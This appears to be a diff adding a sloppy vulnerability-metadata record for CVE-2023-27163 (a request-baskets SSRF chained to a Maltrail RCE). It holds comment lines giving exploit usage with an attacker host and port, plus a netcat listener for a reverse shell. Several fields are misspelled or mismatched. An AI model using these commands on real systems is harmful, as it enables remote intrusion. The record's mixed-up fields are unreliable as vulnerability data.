@@ -1,0 +1,24 @@
+cve: 2023-27163
+metadata:
+    name: Unauthenticated Remote Code Execution 
+auther: iyaad luqman k
+type: Server-Side Request Forgery (SSRF)
+atack vector: network
+-aplication: Maltrail
+    version: 0.53
+Tested on: Ubuntu 22.04
+description: | 
+ request-baskets up to v1. 2.1 was discovered to contain a Server-Side Request Forgery (SSRF) via the component /api/baskets/{name}
+
+# This vulnerability allows attackers to access network resources and sensitive information via a crafted API request.
+
+Vector:  CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N
+severity: 6.5 medium
+vendor: cve 2023-27163
+#exploit use ./exploit.sh <target_url> <attacker_url>:<atacker_port>
+#nc lvnp <atacker_port>
+exploit: 
+    -path: vulnerability/id 51676
+description: |
+An attacker uses cve 2023-27163 to exploit the vulnerability.  https://www.exploit-db.com/exploits/51676
+
